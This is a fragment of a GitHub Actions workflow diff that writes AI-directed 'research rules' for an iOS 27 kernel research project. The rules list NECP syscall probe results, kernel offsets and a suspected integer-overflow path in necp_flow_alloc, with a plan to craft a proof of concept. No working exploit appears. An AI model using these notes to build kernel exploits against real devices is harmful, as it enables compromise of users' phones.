+                      print("patched " + p)
+          PYEOF
+
+      - name: Write rules
+        run: |
+          cat > /tmp/rules.md <<'RULESEOF'
+
+          ## AUTO-GENERATED RESEARCH RULES
+
+          Rewritten by workflow on every push. Read first. Never violate.
+
+          ### 0. MANDATORY - USE INTERNET ON EVERY REQUEST
+
+          - Before answering ANY question, search the web for latest:
+            - iOS 27.0 kernel internals, XNU changelog, Apple security advisories
+            - blacktop/ipsw version notes and CLI syntax
+            - blacktop/symbolicator updates and signature availability
+            - Ghidra 12.x release notes and headless API
+            - LiveContainer / SideStore / AltStore / TrollStore iOS 27 compat
+            - SwiftUI iOS 27 regressions (List, NavigationStack, AttributeGraph)
+            - NECP, mbuf, socket, IOKit bugs papers from 2025-2026
+            - Apple developer forums iOS 27 beta crash threads
+          - If you cannot use internet, say so explicitly.
+          - Never claim a version does not exist without checking.
+          - Never claim an API exists without checking current syntax.
+          - Cite URL when stating a fact that could change.
+
+          ### 1. Update
+          - date: 2026-09-26
+          - device: iPhone14,5 / iOS 27.0 / 24A437
+          - kernel: xnu-13432.2.10~2/RELEASE_ARM64_T8110
+          - signature: ad-hoc, empty entitlements
+
+          ### 2. NECP status
+
+          Working:
+          - op=0x03 returns 1 byte
+          - op=0x04 and op=0x1A return full 280-byte TLV
+          - op=0x0D returns user VA
+
+          Closed:
+          - op=0x05 copy_list -> -1
+          - op=0x0C copy_parameters -> -1
+          - op=0x0F copy_update -> -1
+          - op=0x18/0x19 signed_id -> empty/-1
+          - TLV overflow len=0xffffffff -> rejected
+          - add_flow size 0x24..0xF0, 0xF1+ -> -1
+          - double-free remove_flow x2 -> ret=0 but copy_result=1 byte
+          - copy_result_inner kptr count=0
+          - copy_interface idx 1..10 -> ret=0 no data
+
+          ### 3. Caller graph
+
+          necp_flow_alloc      0xA346E70
+            callers: 0xA346474, 0xA348180
+          necp_handler_big     0xA3D91B4
+            caller:  0xA3D9174
+          necp_get_tlv         0xA4C2034
+            caller:  0xA4C113C (9 BL)
+          necp_open            0xA4E411C
+            not BL-called, dispatcher BR/BLR
+          necp_client_action   0xA4E5C28
+            not BL-called, dispatcher BR/BLR
+          syscall_dispatcher   0xA6CEB84
+
+          ### 4. Potential integer overflow
+
+          necp_flow_alloc 0xA346E70:
+            uVar6 = min(user_count, 0x80)
+            iVar1 = (uVar6 + param_3) * 0x14|0x18
+            kalloc_type_necp_flow(iVar1)
+            copyin(user_ptr, buf, uVar6 * 0x14|0x18)
+          If param_3 wraps int32 -> alloc < copyin -> heap overflow.
+          param_3 origin: need FUN_fffffff00a346474 decompile.
+
+          sbappendcontrol 0xA788A24, sbappendrecord 0xA7873B8:
+            uVar12 += (int)mbuf[3] (32-bit, no overflow check)
+          Not exploitable via sendmsg (kernel rejects >2GB chains).
+
+          ### 5. Confirmed safe
+
+          sooptcopyin       0xA77FD2C  maxlen checked before copyin
+          necp_handler_big  0xA3D91B4  checks uVar21 >= 0x2001, sizes match
+          necp_client_add_flow 0xA4E843C  rejects uVar24 in 0xBF..0xF0
+          necp_update_cache 0xA4EBD58  user ptr only via copyin
+
+          ### 6. iOS 27 runtime crashes
+
+          SIGKILL - CODESIGNING (AMFI) - never call from ad-hoc:
+            proc_info(336) any flavor
+            csops(169) any op
+            task_info flavor sweep 1..40
+            mach_port_names with count > 32
+
+          SIGSYS (sandbox) - never do:
+            blind syscall sweep 0..558 (dies on syscall 78)
+
+          Safe whitelist:
+            getpid(20) getuid(24) getgid(47) getppid(39)
+            geteuid(25) getegid(43) gettid(286) getpgid(202)
+
+          socket / getsockopt / setsockopt / sysctl / uname always safe.
+
+          ### 7. Signature
+
+          Empty entitlements <dict></dict> required for LiveContainer.
+          Non-empty com.apple.private.* -> AMFI kills process.
+          ldid -Snatsuk1/Resources/natsuk1.entitlements
+          Works: Sideloadly, AltStore, TrollStore, ESign, LiveContainer.
+          Does NOT work: LC with privileged entitlements.
+
+          ### 8. Build gotchas
+
+          - #include <mach/mach_vm.h> -> mach_vm.h unsupported in iPhoneOS SDK 26.5.
+            Declare manually:
+              extern kern_return_t mach_vm_read_overwrite(vm_map_t, mach_vm_address_t,
+                  mach_vm_size_t, mach_vm_address_t, mach_vm_size_t*);
+              extern kern_return_t mach_vm_write(vm_map_t, mach_vm_address_t,
+                  vm_offset_t, mach_msg_type_number_t);
+              extern kern_return_t mach_vm_protect(vm_map_t, mach_vm_address_t,
+                  mach_vm_size_t, boolean_t, vm_prot_t);
+          - TCP_KEEPINIT / TCP_FASTOPEN_KEY / SO_REUSEPORT_LF / SO_NO_CHECK not in SDK.
+          - @MainActor + nonisolated(unsafe) static let shared -> compile error.
+            Use final class Foo: ObservableObject, @unchecked Sendable,
+                static let shared, private init().
+          - sysctlbyname("hw.memsize") returns UInt64.
+          - nk_offsets.h MUST define NK_SYSENT_BASE and NK_SYSENT_COUNT
+            (nk_api.c references them).
+
+          ### 9. SwiftUI iOS 27
+
+          - .overlay(RespringView()) - never. WKWebView always loaded,
+            GPU spam -> CA UAF -> SIGSEGV. Use UIHostingController.present.
+          - List { if cond { Section } else { Section } } -> optionalSelectionContainer crash.
+          - .scaleEffect() inside if -> _ConditionalContent breaks.
+          - @Published mutation from Task {} -> race -> UAF. Use Timer.scheduledTimer.
+
+          ### 10. Offsets
+
+          KBASE             0xFFFFFFF007004000
+          SLIDE             0x3D00000
+          SYSENT_BASE       0xFFFFFFF007C192A0
+
+          NECP:
+            necp_open                     0xFFFFFFF00A4E411C
+            necp_client_action            0xFFFFFFF00A4E5C28
+            necp_client_add_flow          0xFFFFFFF00A4E843C
+            necp_client_remove_client     0xFFFFFFF00A4E76F4
+            necp_client_remove_flow       0xFFFFFFF00A4E93C4
+            necp_client_copy_list         0xFFFFFFF00A4E80FC
+            necp_client_copy_result       0xFFFFFFF00A4E7BE8
+            necp_client_copy_result_inner 0xFFFFFFF00A4F26F0
+            necp_client_copy_interface    0xFFFFFFF00A4EAC7C
+            necp_client_copy_update       0xFFFFFFF00A4EC264
+            necp_client_sysctl_arena      0xFFFFFFF00A4EB704
+            necp_get_tlv_at_offset        0xFFFFFFF00A4C2034
+            necp_flow_alloc               0xFFFFFFF00A346E70
+            necp_handler_big              0xFFFFFFF00A3D91B4
+            necp_update_cache             0xFFFFFFF00A4EBD58
+            necp_per_flow_copy            0xFFFFFFF00A4F2E70
+
+          socket:
+            sooptcopyin                   0xFFFFFFF00A77FD2C
+            sbappendcontrol               0xFFFFFFF00A788A24
+            sbappendrecord                0xFFFFFFF00A7873B8
+            sbappendstream                0xFFFFFFF00A78811C
+
+          primitives:
+            copyin                        0xFFFFFFF00A368EC0
+            copyout                       0xFFFFFFF00A369A3C
+            kalloc_type                   0xFFFFFFF00A200988
+            kfree_type                    0xFFFFFFF00A201000
+            kalloc_type_necp_flow         0xFFFFFFF007C62E68
+
+          callers:
+            flow_alloc_caller_1           0xFFFFFFF00A346474
+            flow_alloc_caller_2           0xFFFFFFF00A348180
+            handler_big_caller            0xFFFFFFF00A3D9174
+            tlv_wrapper                   0xFFFFFFF00A4C113C
+            syscall_dispatcher            0xFFFFFFF00A6CEB84
+
+          ### 11. Extract Offsets repo
+
+          Separate repo: murk-sus/Hu-Tao-and-natsuki-anime-music-player
+          workflow: extract_offsets.yml
+          script:   scripts/kernel_rw.py
+          artifacts: result.txt, offsets.json, kernel.log, symbols.json
+
+          Symbolication:
+            ipsw kernel symbolicate --signatures symbolicator/kernel/27.0 --json KERNEL
+            Output path printed to stderr as "Writing symbols as JSON to <path>"
+            Format: {"<decimal_addr>": "<name>"}
+            symbolicator 27.0 has xnu.json (5.3 MB) + 773 kext json
+            loads ~40000 entries
+
+          Jython 2.7:
+            json.load() returns unicode, use isinstance(x, basestring) not str
+            no tabs, only 4 spaces
+            validate: python3 -c "import ast,sys; ast.parse(open(sys.argv[1]).read())"
+
+          Ghidra cache keys (static):
+            ghidra-12.1.2-jython-v4
+            ipsw-3.1.716-v4
+            symbolicator-v6
+            kernelcache-iPhone14_5-24A437-v4
+            ghidra-project-24A437-v4
+
+          Never hashFiles('kernelcache/**') in cache key.
+          Never rm ghidra, ghidra_project, kernelcache, symbolicator in cleanup.
+
+          BL scan Jython:
+            read __text block with memory.getBytes
+            for each 4-byte LE word:
+              op = raw & 0xFC000000
+              if op == 0x94000000 or op == 0x14000000:
+                imm26 = raw & 0x03FFFFFF
+                if imm26 & 0x02000000: imm26 -= 0x04000000
+                dst = (pc + (imm26 << 2)) & 0xFFFFFFFFFFFFFFFF
+                if dst == target: hit
+
+          ### 12. YAML rules
+
+          - One workflow only: fix_and_release.yml
+          - Do not embed C/Swift in heredoc > 30 lines
+          - All heredoc lines indent 10 spaces from left
+          - Endmarker on 10 spaces
+          - set -e only where critical, exit 0 in diagnostics
+          - grep -q -e "pattern" (dash-safe)
+          - Do not delete cached dirs in final cleanup
+
+          ### 13. Next steps
+
+          1. Decompile FUN_fffffff00a346474 and FUN_fffffff00a348180
+             - trace param_3 for necp_flow_alloc
+             - if user-controlled -> craft PoC with int32 wrap value
+          2. Decompile syscall dispatcher 0xA6CEB84
+             - find case 501 (necp_open) and 502 (necp_client_action)
+          3. Decompile FUN_fffffff00a4c113c (TLV wrapper)
+          4. Search IOKit: IOSurface, IOConnectCallMethod, IOHIDEvent
+          5. mbuf: m_copydata, mbuf_copydata with user lengths
+
+          Do not spend more than 2-3 attempts on same primitive.
+
+          ### 14. What NOT to do
+
+          - Do not create fix_and_test.yml or build_and_release.yml
+          - Do not embed C/Swift in heredoc
+          - Do not use hashFiles in cache keys
+          - Do not run blind syscall sweep
+          - Do not call proc_info / csops / task_info sweep / mach_port_names
+          - Do not set non-empty entitlements
+          - Do not mutate @Published from Task {}
+          - Do not put RespringView in SwiftUI tree
+          - Do not call al_device_respring
+          - Do not commit natsuk1.xcodeproj
+          - Do not trust offsets without Ghidra verification
+          - Do not answer without web search first
+          - Do not delete ghidra/ghidra_project/kernelcache/symbolicator in cleanup
+          RULESEOF
+
+      - name: Update README
+        run: |
+          python3 - <<'PYEOF'
+          import re, os
+          p = "README.md"
+          s = open(p).read() if os.path.exists(p) else "# natsuk1\n"
+          rules = open("/tmp/rules.md").read()
+          ms = "<!-- AUTO-RULES-START -->"
+          me = "<!-- AUTO-RULES-END -->"
+          s = re.sub(re.escape(ms) + r".*?" + re.escape(me), "", s, flags=re.DOTALL)
+          s = s.rstrip() + "\n\n" + ms + "\n" + rules + "\n" + me + "\n"
+          open(p, "w").write(s)
+          print("README: %d bytes" % len(s))
+          PYEOF
+
+      - name: Write ai-hints.md
+        run: |
+          cp /tmp/rules.md ai-hints.md
+          echo "ai-hints.md updated"
 
       - name: Install tools
         run: |
@@ -456,9 +873,9 @@ jobs:
           fi
           REPO="${{ github.repository }}"
           IPA_URL="https://github.com/${REPO}/releases/download/development/natsuk1.ipa"
-          NOTES="natsuk1 v7.3
+          NOTES="natsuk1 v8.0
 
-          Empty entitlements — works in LiveContainer AND sideload.
+          Install directly or via LiveContainer (empty entitlements).
 
           IPA: ${IPA_URL}
           AltStore: altstore://install?url=${IPA_URL}
@@ -471,12 +888,12 @@ jobs:
             --title "Development" --prerelease --latest=false \
             --notes "$NOTES"
 
-      - name: Commit README
+      - name: Commit
         run: |
           set -euo pipefail
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
-          git add README.md natsuk1/Resources/natsuk1.entitlements
+          git add -A
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "v7.3: empty entitlements for LiveContainer compat [skip ci]"
+          git commit -m "v8.0: research rules + NECP probes + caller graph [skip ci]"
           git push
